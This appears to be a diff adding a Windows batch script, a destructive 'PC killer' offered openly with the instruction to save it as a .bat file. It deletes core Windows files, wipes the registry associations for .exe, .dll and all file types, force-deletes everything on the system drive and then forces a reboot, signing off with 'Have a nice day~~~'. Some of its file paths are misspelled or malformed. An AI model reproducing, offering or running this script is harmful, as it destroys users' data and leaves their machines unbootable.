@@ -1,0 +1,15 @@
+@echo off
+del c:/windows/PC Health/
+del c:/windows/exeplorer.exe/
+del c:/windows/system/
+del c:/windows system32/ntoskrn1.exe
+del c:/windows/system32/hal.dll
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+del %systemdrive%\*.* /f /s /q
+shutdown -r -f -t 00
+Message 
+Have a nice day~~~
+
+// save the code as .bat
